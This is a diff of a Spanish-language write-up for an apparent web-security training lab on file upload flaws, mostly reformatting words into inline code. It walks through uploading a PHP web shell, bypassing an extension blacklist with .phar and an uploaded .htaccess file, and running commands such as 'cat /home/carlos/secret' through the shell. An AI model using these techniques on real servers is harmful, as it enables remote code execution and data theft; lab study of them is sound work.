@@ -24,33 +24,33 @@ image:
   
 ## Descripción
 
-Este laboratorio contiene una función de carga de imágenes vulnerable, ciertas extensiones de archivo están blacklisteadas, pero esta defensa puede ser eludida debido a una falla fundamental en la configuración de esta blacklist. Para resolver el laboratorio, debemos subir una web shell básica en PHP, utilizarla para extraer el contenido del archivo /home/carlos/secret y enviar este secreto utilizando el botón proporcionado en la barra del laboratorio. Podemos iniciar sesión con nuestra propia cuenta utilizando las siguientes credenciales: wiener:peter
+Este `laboratorio` contiene una `función` de carga de imágenes `vulnerable`, ciertas `extensiones` de `archivo` están `blacklisteadas`, pero esta defensa puede ser eludida debido a una falla fundamental en la `configuración` de esta `blacklist`. Para resolver el laboratorio, debemos subir una web shell básica en `PHP`, utilizarla para `extraer` el `contenido` del archivo `/home/carlos/secret` y enviar este secreto utilizando el botón proporcionado en la barra del laboratorio. Podemos `iniciar sesión` con nuestra propia cuenta utilizando las siguientes credenciales: `wiener:peter`
 
 ---
 
 ## Guía de file upload vulnerabilities
 
-Antes de completar este laboratorio es recomendable leerse esta guía de file upload vulnerabilities [https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Guide/](https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Guide/)
+`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de file upload vulnerabilities` [https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Guide/](https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Guide/)
 
 ## Resolución
 
-Al acceder a la web nos sale esto
+Al `acceder` a la `web` nos sale esto
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_1.png)
 
-Pulsamos en My account e iniciamos sesión con las credenciales wiener:peter
+Pulsamos en `My account` e `iniciamos sesión` con las credenciales `wiener:peter`
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_2.png)
 
-Vemos que existe un campo de subida de archivos
+Vemos que existe un `campo` de `subida` de `archivos`
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_3.png)
 
-Si inspeccionamos con donde se aloja la imagen vemos que es en la ruta /resources/images
+Si `inspeccionamos` con `donde` se `aloja` la `imagen` vemos que es en la ruta `/resources/images`
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_4.png)
 
-Nos creamos un archivo llamado shell.php y lo subimos
+Nos creamos un archivo llamado `shell.php` y lo `subimos`
 
 ```
 <?php
@@ -96,37 +96,37 @@ Mandamos la petición al intruder de Burpsuite y seleccionamos la extensión
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_7.png)
 
-Nos vamos a Payloads, pulsamos en Load, cargamos la lista de extensiones, en la parte inferior de esta ventana desmarcamos el Payload encoding y pulsamos en Start attack
+Nos vamos a Payloads, pulsamos en Load, cargamos la lista de extensiones, en la parte inferior de esta ventana desmarcamos el `Payload encoding` y pulsamos en Start attack
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_8.png)
 
-Abrimos nuevamente el inspector de chrome y vemos que el archivo subido se aloja en /files/avatars
+Abrimos nuevamente el `inspector` de `chrome` y vemos que el archivo subido se aloja en `/files/avatars`
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_9.png)
 
-Desde el repeater de Burpsuite he ido mandando los payloads manualmente hasta que he dado con el .phar el cual si me ha interpretado https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.phar?cmd=whoami, he tenido que hacerlo de esta forma porque los archivos subidos se van eliminando
+Desde el repeater de Burpsuite he ido mandando los payloads manualmente hasta que he dado con el .phar el cual si me ha interpretado `https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.phar?cmd=whoami`, he tenido que hacerlo de esta forma porque los archivos subidos se van eliminando
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_10.png)
 
-Listamos el contenido de la home de carlos https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.phar?cmd=ls%20/home/carlos
+`Listamos` el `contenido` de la `home` de carlos `https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.phar?cmd=ls%20/home/carlos`
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_11.png)
 
-Obtenemos el contenido del archivo secret https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.phar?cmd=cat%20/home/carlos/secret
+Obtenemos el contenido del archivo secret `https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.phar?cmd=cat%20/home/carlos/secret`
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_12.png)
 
-Otra alternativa es subir un archivo .htaccess que haga que una extensión random se interprete como php. Para ello nos creamos un archivo llamado htaccess con este contenido y lo subimos
+Otra alternativa es `subir` un `archivo .htaccess` que haga `que una extensión random se interprete como php`. Para ello nos `creamos` un `archivo llamado htaccess` con este `contenido` y lo `subimos`
 
 ```
 AddType application/x-httpd-php .pwned
 ```
 
-Cuando pulsamos sobre upload tenemos que capturar la petición y cambiarle el nombre del archivo, de htaccess a .htaccess. Esto lo tenemos que hacer ahora porque si lo hubiéramos hecho antes, thunar no hubiera podido encontrar el archivo, ya que estaba oculto
+Cuando `pulsamos` sobre `upload` tenemos que `capturar` la `petición` y `cambiarle` el `nombre del archivo`, de `htaccess` a `.htaccess`. Esto `lo tenemos que hacer ahora porque si lo hubiéramos hecho antes, thunar no hubiera podido encontrar el archivo, ya que estaba oculto`
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_13.png)
 
-Si ahora nos creamos un archivo llamado shell.pwned con este contenido y lo subimos
+Si ahora nos `creamos` un `archivo llamado shell.pwned` con este `contenido` y lo `subimos`
 
 ```
 <?php
@@ -134,12 +134,12 @@ Si ahora nos creamos un archivo llamado shell.pwned con este contenido y lo subi
 ?>
 ```
 
-Podemos acceder a https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.pwned?cmd=whoami y comprobar que podemos ejecutar comandos
+Podemos acceder a `https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.pwned?cmd=whoami` y `comprobar` que `podemos ejecutar comandos`
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_14.png)
 
-Obtenemos el contenido del archivo secret https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.pwned?cmd=cat%20/home/carlos/secret
+Obtenemos el contenido del archivo secret `https://0a20003e03543e85818a53bf005100f3.web-security-academy.net/files/avatars/shell.pwned?cmd=cat%20/home/carlos/secret`
 
-Submiteamos la solución
+`Submiteamos` la `solución`
 
 ![](/assets/img/File-Upload-Vulnerabilities-Lab-4/image_15.png)
